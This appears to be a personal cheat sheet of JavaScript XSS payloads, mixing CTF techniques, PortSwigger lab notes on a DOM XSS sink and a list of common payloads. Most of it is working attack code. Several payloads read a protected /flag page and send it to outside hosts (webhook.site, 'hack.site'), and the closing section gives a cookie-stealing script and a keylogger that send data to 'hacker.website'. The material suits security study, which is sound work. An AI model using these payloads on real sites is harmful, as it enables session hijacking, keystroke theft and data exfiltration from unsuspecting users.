# JavaScript based Payloads

## Basic test payloads

```html
<img src=x onerror=alert(document.domain)>

<script>document.write(123)</script>

```

## Interesting Techniques 


### Technique 1 
>#### Fetch-free technique to obtain a privileged page's content


```html 
<form method="post" id="theForm" action="/flag" target='hacker'>
    <!-- Form body here -->
</form>
<script> 
    let w = window.open('','hacker'); 	
    // w can be accessed as long as same-origin policy is satisfied
    
    document.getElementById('theForm').submit();
    
    setTimeout(()=>{
        document.location= `https://webhook.site/645c63<something>5-a172-a9014e389741?c=${w.document.body.innerHTML}`
    },500);

</script>

```

### Technique 2 
>#### Using quotes and comments to swallow existing content and to achieve XSS


```js
// Server-side code for a To-Do list creation feature with limitations on both individual line size and the entire list size 

const parsed = list
    .trim()
    .split("\n")
    .map((x) => x.trim());
if (parsed.length > 20) {
    res.status(400).send("list must have at most 20 items");
    return;
}
if (parsed.some((x) => x.length > 12)) {
    res.status(400).send("list items must not exceed 12 characters");
    return;
}

// The created list can be accessed as a checkbox list in a HTML file 

```

```html
<!-- Original Payload -->

 <img src=''onerror='fetch("/flag").then(r=> r.text() ).then( t=> window.open("http:"+"//hack"+".site"+"/"+t))'>

 <!-- Modified Payload to satisfy the length requirements -->

<img src='
'onerror='/*
*/fetch("/*
*//flag")./*
*/then(r=>/*
*/r.text()/*
*/).then(/*
*/t=>/*
*/window/*
*/.open(/*
*/"http:"+/* 
*/"//hack"/*
*/+".site/*
*/"+"/"/*
*/+t))'>

<!-- The ' (quote) after the src attritube and the ' before onerror would engulf the in between junk html as an img src and would throw an error.-->

<!-- Anything within the quotes of onerror attritube would be considered as js code. So to omit the junk html associated with each line in the list, comments (/**/) are used. -->

```

### Techniques learnt on PortSwigger Labs

>#### DOM XSS in document.write sink using source location.search
>
> - *General Thought process for XSS (pretending it to be a black box test)* 
> - A "search" text box to search for blogs is present.
> - The text entered in the text box is returned back in the Server's response and gives a semblance of *reflected XSS*. But it isn't possible in reality as the characters such as `'` and `"` are represented using HTML entities.
> - So, must look for the `document.write` sink as the question suggests. 

Spotted the sink in the HTML code:

```html
<script>
    function trackSearch(query) {
        document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        trackSearch(query);
    }
</script>
```
```bash
# First, the 'search' parameter from the query string in URL is extracted and stored in the variable 'query'.

# The variable 'query' is passed to the function 'trackSearch' which uses document.write() (the sink) to write a piece of HTML code to the page which includes the contents of the variable 'query' facilitating DOM based XSS
```

Test Payload :

`/?search=hello"world`

```html
<!-- O/p -->

<img src="/resources/images/tracker.gif?searchTerms=hello" world"="">

<!-- The payload worked! (despite the wierd addition of a SPACE character before the word 'world'; might be a browser thing, not sure) -->
```

XSS Payload : 

`/?search="><img+src%3dx+onerror%3dalert('XSS!')>`

```html
<!-- O/p -->

<img src="/resources/images/tracker.gif?searchTerms=">
<img src="x" onerror="alert('XSS!')">

<!-- The payload worked! (despite the wierd addition of "" (quotes) for the attributes' values of the second "img" tag which wasn't originally present in the payload; might be a browser thing, not sure) -->
```

---


## Common XSS Payloads

```html
<!-- Session Stealing -->

<script>fetch('https[:]//hacker.website/steal?cookie=' + btoa(document.cookie));</script> 

<!-- Key Logger -->

<script>document.onkeypress = function(e) { fetch('https[:]//hacker.website/log?key=' + btoa(e.key) );}</script>
```

